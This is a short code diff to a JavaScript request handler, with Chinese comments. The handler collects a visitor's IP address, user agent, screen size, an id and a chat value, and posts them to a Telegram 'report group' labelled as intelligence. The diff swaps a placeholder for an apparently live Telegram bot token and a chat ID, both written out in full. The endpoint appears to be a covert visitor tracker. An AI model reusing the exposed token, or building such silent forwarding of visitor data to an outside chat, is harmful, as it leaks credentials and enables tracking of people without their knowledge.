@@ -3,9 +3,14 @@ export default async function handler(req, res) {
     const { id, ua, screen, chat } = req.query;
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
 
-    const BOT_TOKEN = "你的机器人TOKEN"; // 填入你的机器人Token
-    const REPORT_CHAT = "-1003659768706"; // 1280报告群ID
+    //const BOT_TOKEN = "你的机器人TOKEN"; // 填入你的机器人Token
+    //const REPORT_CHAT = "-1003659768706"; // 1280报告群ID
 
+
+    const BOT_TOKEN = '8790086518:AAF103Mo8Uk_UYVdURZrZFh1Zjc2wpPV4hU'; 
+    const CHAT_ID = '-1003659768706' // 别忘了前面的负号，如 -100xxxxxxxx
+    // ------------------------------------
+    
     // 1. 发送情报到报告群 (Topic 5)
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
